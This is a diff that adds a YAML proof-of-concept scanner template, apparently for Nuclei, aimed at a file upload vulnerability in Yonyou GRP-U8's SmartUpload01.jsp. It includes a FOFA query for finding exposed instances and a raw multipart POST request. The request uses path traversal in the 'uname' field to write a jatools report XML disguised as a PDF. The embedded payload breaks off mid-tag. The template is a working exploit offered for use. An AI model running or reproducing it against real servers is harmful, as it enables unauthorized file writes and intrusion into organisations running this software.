@@ -1,0 +1,337 @@
+id: poc-nv3dl70wemhgqgkh
+info:
+  name: 用友GRP-U8 SmartUpload01 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nv3dl70wemhgqgkh'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nv3dl70wemhgqgkh
+    fofa: app="用友-GRP-U8"
+http:
+- raw:
+  - 'POST /u8qx/SmartUpload01.jsp HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzhvrkrqt
+
+
+
+
+    ------WebKitFormBoundaryzhvrkrqt
+
+
+    Content-Disposition: form-data; name="uname"
+
+
+
+
+    ../../../../../../../../../dudesuite
+
+
+    ------WebKitFormBoundaryzhvrkrqt
+
+
+    Content-Disposition: form-data; name="input_localfile"; filename="dudesuite.pdf"
+
+
+
+
+    <jatools Class="jatools.ReportDocument" Name="jatools report template">
+
+
+    <VariableContext>
+
+
+    </VariableContext>
+
+
+    <Page>
+
+
+    <Name>panel</Name>
+
+
+    <Children ItemClass="PagePanel">
+
+
+    <Item0>
+
+
+    <Name>header</Name>
+
+
+    <Width>753</Width>
+
+
+    <Height>80</Height>
+
+
+    <Children ItemClass="Label">
+
+
+    <Item0>
+
+
+    <Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>
+
+
+    <ForeColor>-65536</ForeColor>
+
+
+    <X>41</X>
+
+
+    <Y>15</Y>
+
+
+    <Width>362</Width>
+
+
+    <Height>62</Height>
+
+
+    </Item0>
+
+
+    </Children>
+
+
+    <Type>100</Type>
+
+
+    </Item0>
+
+
+    <Item1>
+
+
+    <Name>footer</Name>
+
+
+    <Y>802</Y>
+
+
+    <Width>753</Width>
+
+
+    <Height>280</Height>
+
+
+    <Type>103</Type>
+
+
+    </Item1>
+
+
+    <Item2>
+
+
+    <Name>body</Name>
+
+
+    <Y>80</Y>
+
+
+    <Width>753</Width>
+
+
+    <Height>722</Height>
+
+
+    <Children ItemClass="Table">
+
+
+    <Item0>
+
+
+    <NodePath>学生表</NodePath>
+
+
+    <X>115</X>
+
+
+    <Y>77</Y>
+
+
+    <Children>
+
+
+    <Item0 Class="Label">
+
+
+    <Text>家庭成员</Text>
+
+
+    <Border/>
+
+
+    <PrintStyle>united-level:1;</PrintStyle>
+
+
+    <Cell>
+
+
+    <Row>3</Row>
+
+
+    <Col>0</Col>
+
+
+    <RowSpan>2</RowSpan>
+
+
+    </Cell>
+
+
+    </Item0>
+
+
+    <Item1 Class="Label">
+
+
+    <Text>关系</Text>
+
+
+    <BackColor>-4144897</BackColor>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Row>3</Row>
+
+
+    <Col>1</Col>
+
+
+    </Cell>
+
+
+    </Item1>
+
+
+    <Item2 Class="Label">
+
+
+    <Text>性别</Text>
+
+
+    <BackColor>-4144897</BackColor>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Row>3</Row>
+
+
+    <Col>2</Col>
+
+
+    </Cell>
+
+
+    </Item2>
+
+
+    <Item3 Class="Label">
+
+
+    <Text>年龄</Text>
+
+
+    <BackColor>-4144897</BackColor>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Row>3</Row>
+
+
+    <Col>3</Col>
+
+
+    </Cell>
+
+
+    </Item3>
+
+
+    <Item4 Class="Label">
+
+
+    <Text>得分</Text>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Row>2</Row>
+
+
+    <Col>0</Col>
+
+
+    </Cell>
+
+
+    </Item4>
+
+
+    <Item5 Class="Label">
+
+
+    <Text>性别</Text>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Row>1</Row>
+
+
+    <Col>0</Col>
+
+
+    </Cell>
+
+
+    </Item5>
+
+
+    <Item6 Class="Label">
+
+
+    <Text>姓名</Text>
+
+
+    <Border/>
+
+
+    <Cell>
+
+
+    <Ro'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
